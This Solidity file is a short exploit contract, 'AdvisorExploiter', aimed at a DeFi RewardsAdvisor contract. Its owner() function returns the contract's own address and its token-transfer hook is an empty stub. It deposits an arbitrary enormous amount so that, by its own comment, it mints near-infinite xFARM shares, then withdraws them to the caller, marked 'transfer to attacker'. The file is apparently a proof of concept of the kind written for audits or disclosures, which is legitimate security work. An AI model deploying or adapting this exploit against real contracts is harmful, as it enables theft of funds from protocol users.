//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


interface IRewardsAdvisor {
    function withdraw(
        uint256 shares,
        address to,
        address payable from
    ) external returns (uint256 rewards);

    function deposit(
        uint256 farmDeposit,
        address payable from,
        address to
    ) external returns (uint256 shares);
}

/// @dev exploiter for RewardsAdvisor
contract AdvisorExploiter {

    IRewardsAdvisor rewardsAdvisor;

    constructor(address _rewardsAdvisor) {
        rewardsAdvisor = IRewardsAdvisor(_rewardsAdvisor);
    }

    function owner() external returns (address) {
        return address(this);
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) external {
    }

    /// @dev mints ~inf xFARM, then converts back to FARM
    function runExploit() external {
        uint256 depositAmount = 1e18 * 1e18; // arbitrary
        uint256 shares = rewardsAdvisor.deposit(depositAmount, payable(address(this)), address(this));
        rewardsAdvisor.withdraw(shares, msg.sender, payable(address(this))); // transfer to attacker
    }

}